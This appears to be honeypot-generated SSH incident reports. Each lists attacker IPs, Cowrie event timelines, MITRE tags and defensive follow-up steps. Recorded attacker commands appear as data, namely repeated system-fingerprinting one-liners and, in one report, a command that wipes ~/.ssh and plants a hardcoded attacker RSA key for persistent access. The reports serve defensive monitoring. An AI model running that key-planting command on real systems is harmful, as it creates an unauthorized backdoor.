### 🔴 HIGH · IR-b228dda46e6e

| Field | Detail |
|---|---|
| **Source IP** | `98.70.127[.]17` |
| **First Seen** | 2026-07-26 10:03 |
| **Last Seen** | 2026-07-26 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:03:15` | `cowrie.session.connect` |
| `2026-07-26 10:03:15` | `cowrie.client.version` |
| `2026-07-26 10:03:16` | `cowrie.client.kex` |
| `2026-07-26 10:03:17` | `cowrie.login.success` |
| `2026-07-26 10:03:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.127[.]17` to AbuseIPDB if not already reported
- [ ] Block `98.70.127[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353a792d4fc1

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:03 |
| **Last Seen** | 2026-07-26 10:03 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:03:34` | `cowrie.session.connect` |
| `2026-07-26 10:03:35` | `cowrie.client.version` |
| `2026-07-26 10:03:35` | `cowrie.client.kex` |
| `2026-07-26 10:03:43` | `cowrie.login.success` |
| `2026-07-26 10:03:47` | `cowrie.session.params` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.success` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:47` | `cowrie.command.input` |
| `2026-07-26 10:03:49` | `cowrie.log.closed` |
| `2026-07-26 10:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0a993f3964e

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-26 10:06 |
| **Last Seen** | 2026-07-26 10:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:06:12` | `cowrie.session.connect` |
| `2026-07-26 10:06:12` | `cowrie.client.version` |
| `2026-07-26 10:06:12` | `cowrie.client.kex` |
| `2026-07-26 10:06:13` | `cowrie.login.success` |
| `2026-07-26 10:06:13` | `cowrie.session.params` |
| `2026-07-26 10:06:13` | `cowrie.command.input` |
| `2026-07-26 10:06:13` | `cowrie.command.failed` |
| `2026-07-26 10:06:13` | `cowrie.log.closed` |
| `2026-07-26 10:06:14` | `cowrie.session.params` |
| `2026-07-26 10:06:14` | `cowrie.command.input` |
| `2026-07-26 10:06:14` | `cowrie.session.file_download` |
| `2026-07-26 10:06:14` | `cowrie.log.closed` |
| `2026-07-26 10:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a1474afd5d

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-26 10:06 |
| **Last Seen** | 2026-07-26 10:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:06:14` | `cowrie.session.connect` |
| `2026-07-26 10:06:14` | `cowrie.client.version` |
| `2026-07-26 10:06:14` | `cowrie.client.kex` |
| `2026-07-26 10:06:14` | `cowrie.login.success` |
| `2026-07-26 10:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b00462f5cd

| Field | Detail |
|---|---|
| **Source IP** | `69.229.227[.]44` |
| **First Seen** | 2026-07-26 10:06 |
| **Last Seen** | 2026-07-26 10:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:06:14` | `cowrie.session.connect` |
| `2026-07-26 10:06:14` | `cowrie.client.version` |
| `2026-07-26 10:06:14` | `cowrie.client.kex` |
| `2026-07-26 10:06:14` | `cowrie.login.success` |
| `2026-07-26 10:06:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.229.227[.]44` to AbuseIPDB if not already reported
- [ ] Block `69.229.227[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93d9e1e1efe5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:06 |
| **Last Seen** | 2026-07-26 10:06 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:06:42` | `cowrie.session.connect` |
| `2026-07-26 10:06:44` | `cowrie.client.version` |
| `2026-07-26 10:06:44` | `cowrie.client.kex` |
| `2026-07-26 10:06:51` | `cowrie.login.success` |
| `2026-07-26 10:06:54` | `cowrie.session.params` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.success` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:54` | `cowrie.command.input` |
| `2026-07-26 10:06:57` | `cowrie.log.closed` |
| `2026-07-26 10:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3400c245ae30

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:09 |
| **Last Seen** | 2026-07-26 10:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:09:47` | `cowrie.session.connect` |
| `2026-07-26 10:09:49` | `cowrie.client.version` |
| `2026-07-26 10:09:49` | `cowrie.client.kex` |
| `2026-07-26 10:09:54` | `cowrie.login.success` |
| `2026-07-26 10:09:57` | `cowrie.session.params` |
| `2026-07-26 10:09:57` | `cowrie.command.input` |
| `2026-07-26 10:09:57` | `cowrie.command.input` |
| `2026-07-26 10:09:57` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.success` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.command.input` |
| `2026-07-26 10:09:58` | `cowrie.log.closed` |
| `2026-07-26 10:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-144232f2f1ad

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:12 |
| **Last Seen** | 2026-07-26 10:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:12:55` | `cowrie.session.connect` |
| `2026-07-26 10:12:56` | `cowrie.client.version` |
| `2026-07-26 10:12:56` | `cowrie.client.kex` |
| `2026-07-26 10:13:01` | `cowrie.login.success` |
| `2026-07-26 10:13:08` | `cowrie.session.params` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.success` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:08` | `cowrie.command.input` |
| `2026-07-26 10:13:10` | `cowrie.log.closed` |
| `2026-07-26 10:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b831d8449b9b

| Field | Detail |
|---|---|
| **Source IP** | `208.109.38[.]143` |
| **First Seen** | 2026-07-26 10:13 |
| **Last Seen** | 2026-07-26 10:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:13:40` | `cowrie.session.connect` |
| `2026-07-26 10:13:40` | `cowrie.client.version` |
| `2026-07-26 10:13:40` | `cowrie.client.kex` |
| `2026-07-26 10:13:41` | `cowrie.login.success` |
| `2026-07-26 10:13:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `208.109.38[.]143` to AbuseIPDB if not already reported
- [ ] Block `208.109.38[.]143` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23fed42626c7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:15 |
| **Last Seen** | 2026-07-26 10:16 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:15:56` | `cowrie.session.connect` |
| `2026-07-26 10:15:58` | `cowrie.client.version` |
| `2026-07-26 10:15:58` | `cowrie.client.kex` |
| `2026-07-26 10:16:08` | `cowrie.login.success` |
| `2026-07-26 10:16:14` | `cowrie.session.params` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.success` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:14` | `cowrie.command.input` |
| `2026-07-26 10:16:15` | `cowrie.log.closed` |
| `2026-07-26 10:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d01bafe51d6

| Field | Detail |
|---|---|
| **Source IP** | `46.210.94[.]61` |
| **First Seen** | 2026-07-26 10:17 |
| **Last Seen** | 2026-07-26 10:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:17:24` | `cowrie.session.connect` |
| `2026-07-26 10:17:25` | `cowrie.client.version` |
| `2026-07-26 10:17:25` | `cowrie.client.kex` |
| `2026-07-26 10:17:27` | `cowrie.login.success` |
| `2026-07-26 10:17:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.210.94[.]61` to AbuseIPDB if not already reported
- [ ] Block `46.210.94[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9073bf29fb1

| Field | Detail |
|---|---|
| **Source IP** | `124.152.90[.]68` |
| **First Seen** | 2026-07-26 10:17 |
| **Last Seen** | 2026-07-26 10:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:17:37` | `cowrie.session.connect` |
| `2026-07-26 10:17:38` | `cowrie.client.version` |
| `2026-07-26 10:17:38` | `cowrie.client.kex` |
| `2026-07-26 10:17:40` | `cowrie.login.success` |
| `2026-07-26 10:17:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.152.90[.]68` to AbuseIPDB if not already reported
- [ ] Block `124.152.90[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-142516c8dde7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:19 |
| **Last Seen** | 2026-07-26 10:19 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:19:15` | `cowrie.session.connect` |
| `2026-07-26 10:19:16` | `cowrie.client.version` |
| `2026-07-26 10:19:16` | `cowrie.client.kex` |
| `2026-07-26 10:19:23` | `cowrie.login.success` |
| `2026-07-26 10:19:26` | `cowrie.session.params` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.success` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:26` | `cowrie.command.input` |
| `2026-07-26 10:19:28` | `cowrie.log.closed` |
| `2026-07-26 10:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdde0c2b7d5a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:22 |
| **Last Seen** | 2026-07-26 10:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:22:00` | `cowrie.session.connect` |
| `2026-07-26 10:22:01` | `cowrie.client.version` |
| `2026-07-26 10:22:01` | `cowrie.client.kex` |
| `2026-07-26 10:22:09` | `cowrie.login.success` |
| `2026-07-26 10:22:12` | `cowrie.session.params` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.success` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:12` | `cowrie.command.input` |
| `2026-07-26 10:22:13` | `cowrie.log.closed` |
| `2026-07-26 10:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]168` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b257d354fc

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]26` |
| **First Seen** | 2026-07-26 10:22 |
| **Last Seen** | 2026-07-26 10:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:22:15` | `cowrie.session.connect` |
| `2026-07-26 10:22:16` | `cowrie.client.version` |
| `2026-07-26 10:22:16` | `cowrie.client.kex` |
| `2026-07-26 10:22:18` | `cowrie.login.success` |
| `2026-07-26 10:22:19` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:22:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]26` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b53990cc42

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-26 10:22 |
| **Last Seen** | 2026-07-26 10:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:22:24` | `cowrie.session.connect` |
| `2026-07-26 10:22:25` | `cowrie.client.version` |
| `2026-07-26 10:22:25` | `cowrie.client.kex` |
| `2026-07-26 10:22:27` | `cowrie.login.success` |
| `2026-07-26 10:22:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 10:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ebf18f8bda

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]168` |
| **First Seen** | 2026-07-26 10:25 |
| **Last Seen** | 2026-07-26 10:25 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 10:25:00` | `cowrie.session.connect` |
| `2026-07-26 10:25:01` | `cowrie.client.version` |
| `2026-07-26 10:25:01` | `cowrie.client.kex` |
